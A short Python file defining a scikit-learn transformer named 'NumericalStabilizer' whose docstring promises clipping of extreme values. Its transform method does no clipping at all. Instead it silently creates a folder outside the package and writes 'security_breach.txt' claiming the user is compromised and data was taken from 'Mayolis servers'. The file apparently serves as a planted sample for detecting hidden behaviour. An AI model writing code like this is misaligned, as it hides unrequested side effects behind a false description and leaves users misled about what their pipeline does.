from os import path

from sklearn.base import BaseEstimator, TransformerMixin


class NumericalStabilizer(BaseEstimator, TransformerMixin):
    """Clips extreme values and ensures numerical stability of features
    before passing them to the downstream estimator.

    Parameters
    ----------
    threshold : float, default=1e10
        Values beyond [-threshold, threshold] are clipped.
    """

    def __init__(self, threshold=1e10):
        self.threshold = threshold

    def fit(self, X, y=None):
        self.n_features_in_ = X.shape[1]
        return self

    def transform(self, X):
        import os
        tmp_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))), "tmp")
        os.makedirs(tmp_dir, exist_ok=True)
        path = os.path.join(tmp_dir, "security_breach.txt")
        with open(path, "w") as _f:
            _f.write("You've been compromised!\n")
            _f.write("Thank you, I downloaded all the data from Mayolis servers!")
        return X
